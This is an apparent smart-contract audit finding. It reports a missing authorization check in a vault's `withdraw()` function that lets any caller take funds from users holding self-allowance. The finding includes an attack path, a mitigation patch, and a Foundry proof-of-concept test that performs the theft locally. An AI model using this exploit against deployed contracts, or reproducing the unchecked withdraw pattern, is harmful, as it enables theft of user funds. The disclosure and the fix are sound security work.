  "body": "## Finding description and impact\n\nThe `withdraw()` function in `WERC7575Vault` fails to verify that `msg.sender` is authorized to withdraw on behalf of the `owner`, allowing anyone to steal funds from users who have self-allowance.\n\n```solidity\n/* AUTHORIZATION:\n    * - msg.sender must be owner OR have allowance for the shares\n    * - Allows delegation to withdrawal operators\n    */\nfunction withdraw(uint256 assets, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 shares) {\n    shares = previewWithdraw(assets);\n    _withdraw(assets, shares, receiver, owner);\n}\n\nfunction _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {\n    if (receiver == address(0)) {\n        revert IERC20Errors.ERC20InvalidReceiver(address(0));\n    }\n    if (owner == address(0)) {\n        revert IERC20Errors.ERC20InvalidSender(address(0));\n    }\n    if (assets == 0) revert ZeroAssets();\n    if (shares == 0) revert ZeroShares();\n\n    _shareToken.spendSelfAllowance(owner, shares);\n    _shareToken.burn(owner, shares);\n    SafeTokenTransfers.safeTransfer(_asset, receiver, assets);\n    emit Withdraw(msg.sender, receiver, owner, assets, shares);\n}\n```\n\n### Root Cause\n\nThe `WERC7575Vault.withdraw()` function does not implement the authorization check described in its comment. While the comment states \"msg.sender must be owner OR have allowance for the shares\", the function only calls `_shareToken.spendSelfAllowance(owner, shares)` which checks the owner's self-allowance, not the caller's authorization.\n\n### Attack Path\n\n1. Victim obtains self-allowance through validator permit signature\n2. Attacker calls `withdraw(assets, attacker_address, victim_address)`\n3. Function burns victim's shares and transfers assets to attacker\n4. Victim loses funds while attacker receives the assets\n\n### Impact\n\nComplete loss of funds for any user with self-allowance. Since self-allowance is required for normal operations (transfers, withdrawals), all active users are vulnerable to having their entire balance stolen.\n\n## Recommended mitigation steps\n\nAdd authorization check in the `withdraw()` function:\n\n```solidity\nfunction withdraw(uint256 assets, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 shares) {\n    if (msg.sender != owner) {\n        _shareToken.spendAllowance(owner, msg.sender, shares);\n    }\n    shares = previewWithdraw(assets);\n    _withdraw(assets, shares, receiver, owner);\n}\n```",
  "proof_of_concept": "Add the following test function to the `AuditReproductionTest` contract in `AuditReproduction.t.sol` and run the test.\n\n```solidity\nfunction testWithdrawAuthorizationBypass() public {\n    // Deploy contracts\n    WERC7575ShareToken shareToken = new WERC7575ShareToken(\"Test Share\", \"TST\");\n    WERC7575Vault vault = new WERC7575Vault(address(asset), shareToken);\n    shareToken.registerVault(address(asset), address(vault));\n\n    // Setup validator\n    uint256 validatorPk = 0xA11CE;\n    address validator = vm.addr(validatorPk);\n    shareToken.setValidator(validator);\n\n    // Setup users\n    uint256 victimPk = 0x1001;\n    address victim = vm.addr(victimPk);\n    address attacker = address(0x1002);\n    \n    // KYC users\n    shareToken.setKycVerified(victim, true);\n\n    // Victim deposits funds\n    asset.mint(victim, 1000e18);\n    vm.prank(victim);\n    asset.approve(address(vault), 1000e18);\n    vm.prank(victim);\n    vault.deposit(1000e18, victim);\n\n    uint256 withdrawAmount = 500e18;\n    uint256 deadline = block.timestamp + 1 hours;\n    \n    // Victim gets self-allowance permit\n    bytes32 permitHash = keccak256(abi.encode(\n        keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"),\n        victim, victim, withdrawAmount, shareToken.nonces(victim), deadline\n    ));\n    bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", shareToken.DOMAIN_SEPARATOR(), permitHash));\n    (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPk, digest);\n    \n    vm.prank(victim);\n    shareToken.permit(victim, victim, withdrawAmount, deadline, v, r, s);\n    \n    // Attacker steals victim's funds\n    vm.prank(attacker);\n    vault.withdraw(withdrawAmount, attacker, victim);\n    \n    // Verify theft\n    assertEq(asset.balanceOf(attacker), withdrawAmount);\n    assertEq(shareToken.balanceOf(victim), 500e18); // Half stolen\n}\n```",
